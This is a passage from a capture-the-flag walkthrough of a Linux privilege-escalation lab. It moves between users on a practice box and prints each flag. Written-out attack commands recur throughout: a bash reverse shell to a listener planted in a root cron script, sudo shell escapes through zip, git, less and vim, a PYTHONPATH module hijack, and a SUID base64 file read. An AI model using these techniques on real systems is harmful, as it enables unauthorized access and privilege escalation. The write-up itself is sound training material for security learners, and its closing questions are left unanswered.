mission29@linuxagency:~/bludit$ cat .htpasswd
mission30{d25b4c9fac38411d2fcb4796171bda6e}
```

# Answer : mission30{d25b4c9fac38411d2fcb4796171bda6e}

# What is viktor's Flag?

So now we have **git**. Just check the log first ^^

```
mission30@linuxagency:~$ ls -la
total 36
drwxr-x---  3 mission30 mission30 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission30 mission30    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission30 mission30  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 mission30 mission30 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission30 mission30  807 Jan 12  2021 .profile
drwxr-xr-x  3 mission30 mission30 4096 Jan 12  2021 Escalator
-rw-r--r--  1 mission30 mission30 8980 Jan 12  2021 examples.desktop
mission30@linuxagency:~$ cd Escalator/
mission30@linuxagency:~/Escalator$ git log
commit 24cbf44a9cb0e65883b3f76ef5533a2b2ef96497 (HEAD -> master, origin/master)
Author: root <root@Xyan1d3>
Date:   Mon Jan 11 15:37:56 2021 +0530

    My 1st python Script

commit e0b807dbeb5aba190d6307f072abb60b34425d44
Author: root <root@Xyan1d3>
Date:   Mon Jan 11 15:36:40 2021 +0530

    Your flag is viktor{b52c60124c0f8f85fe647021122b3d9a}
```

# Answer : viktor{b52c60124c0f8f85fe647021122b3d9a}

---
# Privilege escalation

# What is dalia's flag?

First step is to check what command you are able to use as **viktor**
```
viktor@linuxagency:~$ pwd
/home/viktor
viktor@linuxagency:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password:
Sorry, user viktor may not run sudo on linuxagency.
```

We cannot check this point by using **sudo -l**. We continue our investigation by checking the **crontab** to see if we don't have any interesting script running.

```
viktor@linuxagency:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	dalia	sleep 30;/opt/scripts/47.sh
*  *	* * *	root	echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d > /opt/scripts/47.sh;chown viktor:viktor /opt/scripts/47.sh;chmod +x /opt/scripts/47.sh;
```

We have permission to execute this script **47.sh**. This script is overwritten and  executed after **30 seconds**. 
We can create a revershell ^^

```
viktor@linuxagency:~$ cat /opt/scripts/47.sh
#!/bin/bash
bash -i >& /dev/tcp/10.4.2.132/4242 0>&1
```
```
nc -lnvp 4242
Connection from 10.10.186.37:57456
bash: cannot set terminal process group (2375): Inappropriate ioctl for device
bash: no job control in this shell
dalia@linuxagency:~$ ls -la
ls -la
total 36
drwxr-x---  2 dalia dalia 4096 Jan 12  2021 .
drwxr-xr-x 45 root  root  4096 Jan 12  2021 ..
lrwxrwxrwx  1 dalia dalia    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 dalia dalia  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 dalia dalia 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 dalia dalia 8980 Jan 12  2021 examples.desktop
-r--------  1 dalia dalia   40 Jan 12  2021 flag.txt
-rw-r--r--  1 dalia dalia  807 Jan 12  2021 .profile
dalia@linuxagency:~$ cat flag.txt
cat flag.txt
dalia{4a94a7a7bb4a819a63a33979926c77dc}
```

# Answer : dalia{4a94a7a7bb4a819a63a33979926c77dc}

# What is silvio's flag?

Now we need to upgrade our session to be able to work properly. For that, please follow the sequence : 
```
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
control+z to background
stty raw -echo
fg
export TERM=xterm
```

Now, let's check **sudo -l**
```
dalia@linuxagency:~$ sudo -l
sudo -l
Matching Defaults entries for dalia on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dalia may run the following commands on linuxagency:
    (silvio) NOPASSWD: /usr/bin/zip
```

Good news, we can execute **.usr/bin/zip**. Let's check [GTFOBINS](https://gtfobins.github.io/gtfobins/zip/#shell)
```
dalia@linuxagency:~$ TF=$(mktemp -u)
TF=$(mktemp -u)
dalia@linuxagency:~$ sudo -u silvio zip $TF /etc/hosts -T -TT 'bash #'
sudo -u silvio zip $TF /etc/hosts -T -TT 'bash #'
  adding: etc/hosts (deflated 37%)
id
uid=1032(silvio) gid=1032(silvio) groups=1032(silvio)
cat /home/silvio/
cat: /home/silvio/: Is a directory
cd /home/silvio
pwd
/home/silvio
ls -l
total 16
-rw-r--r-- 1 silvio silvio 8980 Jan 12  2021 examples.desktop
-rw-r--r-- 1 silvio silvio   41 Jan 12  2021 flag.txt
cat flag.txt
silvio{657b4d058c03ab9988875bc937f9c2ef}

```

# Answer : silvio{657b4d058c03ab9988875bc937f9c2ef}

# What is reza's flag?

Same as usual, check **sudo -l**
```
silvio@linuxagency:~$ sudo -l
sudo -l
Matching Defaults entries for silvio on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User silvio may run the following commands on linuxagency:
    (reza) SETENV: NOPASSWD: /usr/bin/git
```

Now we can execute **/usr/bin/git**.  Let's check [GTFOBINS](https://gtfobins.github.io/gtfobins/git/#shell). We canuse the first method.

```
sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
$ whoami
whoami
reza
$ pwd
pwd
/home/silvio
$ cd /home/reza
cd /home/reza
$ ls -l
ls -l
total 16
-rw-r--r-- 1 reza reza 8980 Jan 12  2021 examples.desktop
-r-------- 1 reza reza   39 Jan 12  2021 flag.txt
$ cat flag.txt
cat flag.txt
reza{2f1901644eda75306f3142d837b80d3e}
```

# Answer : reza{2f1901644eda75306f3142d837b80d3e}

# What is jordan's flag?

As usual :
```
reza@linuxagency:~$ sudo -l
sudo -l
Matching Defaults entries for reza on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User reza may run the following commands on linuxagency:
    (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
```

Let's check this script
```
reza@linuxagency:~$ sudo -l
sudo -l
Matching Defaults entries for reza on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User reza may run the following commands on linuxagency:
    (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
reza@linuxagency:~$ cat /opt/scripts/Gun-Shop.py
cat /opt/scripts/Gun-Shop.py
cat: /opt/scripts/Gun-Shop.py: Permission denied
reza@linuxagency:~$ sudo -u jordan /opt/scripts/Gun-Shop.py
sudo -u jordan /opt/scripts/Gun-Shop.py
Traceback (most recent call last):
  File "/opt/scripts/Gun-Shop.py", line 2, in <module>
    import shop
ModuleNotFoundError: No module named 'shop'
```

Let's check the policy details by using **sudo -ll**
```
reza@linuxagency:~$ sudo -ll
sudo -ll
Matching Defaults entries for reza on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User reza may run the following commands on linuxagency:

Sudoers entry:
    RunAsUsers: jordan
    Options: setenv, !authenticate
    Commands:
	/opt/scripts/Gun-Shop.py
```
**setenv** is available.
```
reza@linuxagency:~$ sudo -u jordan PYTHONPATH=/tmp/testshop/ /opt/scripts/Gun-Shop.py
<rdan PYTHONPATH=/tmp/testshop/ /opt/scripts/Gun-Shop.py
jordan@linuxagency:/home/reza$ whoami
whoami
jordan
jordan@linuxagency:/home/reza$ cd /home/jordan
cd /home/jordan
jordan@linuxagency:~$ ls -l
ls -l
total 16
-rw-r--r-- 1 jordan jordan 8980 Jan 12  2021 examples.desktop
-rw------- 1 jordan jordan   41 Jan 12  2021 flag.txt
jordan@linuxagency:~$ cat flag.txt
cat flag.txt
}3c3e9f8796493b98285b9c13c3b4cbcf{nadroj
```

Reverse
```
jordan@linuxagency:~$ cat flag.txt | rev
cat flag.txt | rev
jordan{fcbc4b3c31c9b58289b3946978f9e3c3}
```

# Answer : jordan{fcbc4b3c31c9b58289b3946978f9e3c3}

# What is ken's flag?

**sudo -l**

```
jordan@linuxagency:~$ sudo -l
sudo -l
Matching Defaults entries for jordan on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jordan may run the following commands on linuxagency:
    (ken) NOPASSWD: /usr/bin/less
```

[GTFOBINS](https://gtfobins.github.io/gtfobins/less/#shell)

```
sudo -u ken less /etc/profile
!/bin/bash
!/bin/bash
ken@linuxagency:/home/jordan$ whoami
whoami
ken
ken@linuxagency:/home/jordan$ cd /home/ken
cd /home/ken
ken@linuxagency:~$ cat flag.txt
cat flag.txt
ken{4115bf456d1aaf012ed4550c418ba99f}
```

# Answer : ken{4115bf456d1aaf012ed4550c418ba99f}

# What is sean's flag?

**sudo -l**
```
ken@linuxagency:~$ sudo -l
sudo -l
Matching Defaults entries for ken on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ken may run the following commands on linuxagency:
    (sean) NOPASSWD: /usr/bin/vim
```

[GTFOBINS](https://gtfobins.github.io/gtfobins/vim/#shell)
```
ken@linuxagency:~$ sudo -u sean vim -c ':!/bin/bash'
sudo -u sean vim -c ':!/bin/bash'

E558: Terminal entry not found in terminfo
'unknown' not known. Available builtin terminals are:
    builtin_amiga
    builtin_beos-ansi
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_debug
    builtin_dumb
defaulting to 'ansi'

:!/bin/bash
sean@linuxagency:/home/ken$ whoami
whoami
sean
```

We don't find something in **sean** home
```
sean@linuxagency:~$ ls -la
ls -la
total 36
drwxr-x---  2 sean sean 4096 Dec  5 17:23 .
drwxr-xr-x 45 root root 4096 Jan 12  2021 ..
lrwxrwxrwx  1 sean sean    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 sean sean  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 sean sean 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 sean sean 8980 Jan 12  2021 examples.desktop
-rw-r--r--  1 sean sean  807 Jan 12  2021 .profile
-rw-------  1 sean sean  582 Dec  5 17:23 .viminfo
```
We xcan try to find the flag by checking the file system
```
sean@linuxagency:~$ grep -rn "sean{" /var/log 2>/dev/null
grep -rn "sean{" /var/log 2>/dev/null
/var/log/syslog.bak:98675:Jan 12 02:58:58 ubuntu kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x6d] high edge lint[0x1]) : sean{4c5685f4db7966a43cf8e95859801281} VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==
```

# Answer : sean{4c5685f4db7966a43cf8e95859801281}

# What is penelope's flag?

From the previous mission,  we catch something encoded in  base64.

Let’s try to decode it
```
sean@linuxagency:~$ echo 'VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==' | base64 -d
<JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==' | base64 -d
The password of penelope is p3nelope
```

We can now SSH the targeted machine. Consider this step as your checkpoint ^^

```
penelope@linuxagency:~$ ls -l
total 56
-rwsr-sr-x 1 maya     maya     39096 Jan 12  2021 base64
-rw-r--r-- 1 penelope penelope  8980 Jan 12  2021 examples.desktop
-r-------- 1 penelope penelope    43 Jan 12  2021 flag.txt
penelope@linuxagency:~$ cat flag.txt
penelope{2da1c2e9d2bd0004556ae9e107c1d222}
```

# Answer : penelope{2da1c2e9d2bd0004556ae9e107c1d222}

# What is maya's flag?

Inside the **penelope** directory, we found an executable **base64**.

Quick check in [GTFOBINS](https://gtfobins.github.io/gtfobins/base64/#file-read)
```
penelope@linuxagency:~$ LFILE=/home/maya/flag.txt
penelope@linuxagency:~$ /home/penelope/base64 "$LFILE" | base64 -d
maya{a66e159374b98f64f89f7c8d458ebb2b}
```

# Answer : maya{a66e159374b98f64f89f7c8d458ebb2b}

# What is robert's Passphrase?

Now we have access to **Maya** home. Many files, let's investigate ^^
```
maya@linuxagency:/home/penelope$ cd ..
maya@linuxagency:/home$ cd maya/
maya@linuxagency:~$ ls -la
total 52
drwxr-x---  5 maya maya 4096 Jan 15  2021 .
drwxr-xr-x 45 root root 4096 Jan 12  2021 ..
lrwxrwxrwx  1 maya maya    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 maya maya  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 maya maya 3771 Jan 12  2021 .bashrc
drwxr-xr-x  3 maya maya 4096 Jan 12  2021 .local
-rw-r--r--  1 maya maya  807 Jan 12  2021 .profile
drwx------  2 maya maya 4096 Jan 12  2021 .ssh
-rw-r--r--  1 maya maya  519 Jan 12  2021 elusive_targets.txt
-rw-r--r--  1 maya maya 8980 Jan 12  2021 examples.desktop
-r--------  1 maya maya   39 Jan 12  2021 flag.txt
drwxr-xr-x  2 maya maya 4096 Jan 15  2021 old_robert_ssh
```

- First : **elusive_targets.txt**
```
maya@linuxagency:~$ cat elusive_targets.txt
Welcome 47 glad you made this far.
You have made our Agency very proud.

But, we have a last unfinished job which is to infiltrate kronstadt industries.
He has a entrypoint at localhost.

Previously, Another agent tried to infiltrate kronstadt industries nearly 3 years back, But we failed.
Robert is involved to be illegally hacking into our server's.

He was able to transfer the .ssh folder from robert's home directory.

The old .ssh is kept inside old_robert_ssh directory incase you need it.

Good Luck!!!
    47
```

Let's check **old_robert_ssh**
```
maya@linuxagency:~$ cd old_robert_ssh/
maya@linuxagency:~/old_robert_ssh$ ls -l
total 8
-rw------- 1 maya maya 1766 Jan 12  2021 id_rsa
-rw-r--r-- 1 maya maya  401 Jan 15  2021 id_rsa.pub
```

# What is user.txt?

# What is root.txt?






